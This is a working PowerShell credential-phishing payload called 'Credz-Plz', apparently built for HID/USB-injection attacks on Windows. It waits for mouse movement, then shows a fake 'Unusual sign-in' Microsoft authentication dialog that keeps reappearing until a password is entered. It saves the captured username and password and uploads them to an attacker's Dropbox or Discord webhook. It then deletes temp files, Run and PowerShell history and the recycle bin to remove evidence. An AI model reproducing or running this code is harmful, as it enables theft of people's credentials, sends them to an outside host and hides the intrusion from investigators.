############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : Credz-Plz         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.2               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Credentials       | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 7,10,11   |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                        [...]
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

<#
.SYNOPSIS
	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message

.DESCRIPTION 
	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
	This will be followed by a fake authentication ui prompt. 
	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
	Once the target enters their credentials their information will be uploaded to either your Dropbox or Discord webhook for collection

.Link
	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads

#>

#------------------------------------------------------------------------------------------------------------------------------------
# This is for if you want to host your own version of the script

# $db = "YOUR-DROPBOX-ACCESS-TOKEN"

# $dc = "YOUR-DISCORD-WEBHOOK"

#------------------------------------------------------------------------------------------------------------------------------------

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to generate the ui.prompt you will use to harvest their credentials
#>

function Get-Creds {

    Add-Type -AssemblyName PresentationCore,PresentationFramework,System.Windows.Forms
    $form = $null

    while ($form -eq $null)
    {
        try {
            # Create a custom credential form using WPF/WinForms
            $form = New-Object System.Windows.Forms.Form
            $form.Text = "Authentication Required"
            $form.Size = New-Object System.Drawing.Size(350,180)
            $form.StartPosition = "CenterScreen"
            $form.TopMost = $true
            $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
            $form.MaximizeBox = $false
            $form.MinimizeBox = $false
            $form.ShowInTaskbar = $false
            
            # Message label
            $msgLabel = New-Object System.Windows.Forms.Label
            $msgLabel.Location = New-Object System.Drawing.Point(10,10)
            $msgLabel.Size = New-Object System.Drawing.Size(320,30)
            $msgLabel.Text = "Unusual sign-in activity. Please verify your account."
            $form.Controls.Add($msgLabel)
            
            # Username label and textbox
            $userLabel = New-Object System.Windows.Forms.Label
            $userLabel.Location = New-Object System.Drawing.Point(10,45)
            $userLabel.Size = New-Object System.Drawing.Size(80,20)
            $userLabel.Text = "Username:"
            $form.Controls.Add($userLabel)
            
            $userText = New-Object System.Windows.Forms.TextBox
            $userText.Location = New-Object System.Drawing.Point(100,45)
            $userText.Size = New-Object System.Drawing.Size(230,20)
            $userText.Text = "$([Environment]::UserDomainName)\$([Environment]::UserName)"
            $form.Controls.Add($userText)
            
            # Password label and textbox
            $passLabel = New-Object System.Windows.Forms.Label
            $passLabel.Location = New-Object System.Drawing.Point(10,75)
            $passLabel.Size = New-Object System.Drawing.Size(80,20)
            $passLabel.Text = "Password:"
            $form.Controls.Add($passLabel)
            
            $passText = New-Object System.Windows.Forms.TextBox
            $passText.Location = New-Object System.Drawing.Point(100,75)
            $passText.Size = New-Object System.Drawing.Size(230,20)
            $passText.UseSystemPasswordChar = $true
            $form.Controls.Add($passText)
            
            # OK Button
            $okButton = New-Object System.Windows.Forms.Button
            $okButton.Location = New-Object System.Drawing.Point(175,110)
            $okButton.Size = New-Object System.Drawing.Size(75,23)
            $okButton.Text = "OK"
            $okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
            $form.AcceptButton = $okButton
            $form.Controls.Add($okButton)
            
            # Cancel Button
            $cancelButton = New-Object System.Windows.Forms.Button
            $cancelButton.Location = New-Object System.Drawing.Point(255,110)
            $cancelButton.Size = New-Object System.Drawing.Size(75,23)
            $cancelButton.Text = "Cancel"
            $cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
            $form.CancelButton = $cancelButton
            $form.Controls.Add($cancelButton)
            
            # Keep form on top and in focus
            $form.Add_Shown({
                $form.Activate()
                $form.TopMost = $true
                [System.Windows.Forms.SendKeys]::SendWait("")
                $passText.Select()
            })
            
            $result = $form.ShowDialog()
            
            if ($result -eq [System.Windows.Forms.DialogResult]::OK -and -not [string]::IsNullOrWhiteSpace($passText.Text)) {
                $creds = @{
                    UserName = $userText.Text
                    Password = $passText.Text
                    Domain = ([Environment]::UserDomainName)
                }
                $form.Close()
                $form.Dispose()
                return $creds
            }
            else {
                if ([string]::IsNullOrWhiteSpace($passText.Text)) {
                    [System.Windows.Forms.MessageBox]::Show("Password cannot be empty!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Stop) | Out-Null
                }
                $form.Close()
                $form.Dispose()
                $form = $null
            }
        }
        catch {
            if ($form) { 
                $form.Close()
                $form.Dispose()
            }
            Write-Host "Error in credential capture: $_"
            $form = $null
        }
    }
}

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to pause the script until a mouse movement is detected
#>

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}
#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
#>

Pause-Script

Caps-Off

Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "The user clicked: $Result"

$creds = Get-Creds

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to save the gathered credentials to a file in the temp directory
#>

if ($creds) {
    "$($creds.UserName):$($creds.Password)" | Out-File -FilePath "$env:TMP\$FileName" -Encoding ASCII -Force
}

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to upload your files to dropbox
#>

function DropBox-Upload {

[CmdletBinding()]
param (
	
[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
[Alias("f")]
[string]$SourceFilePath
) 
$outputFile = Split-Path $SourceFilePath -leaf
$TargetFilePath="/$outputFile"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db)) -and (Test-Path "$env:TMP\$FileName")){DropBox-Upload -f "$env:TMP\$FileName"}

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc)) -and (Test-Path "$env:TMP\$FileName")){Upload-Discord -file "$env:TMP\$FileName"}

#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

Remove-Item "$env:TEMP\*" -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
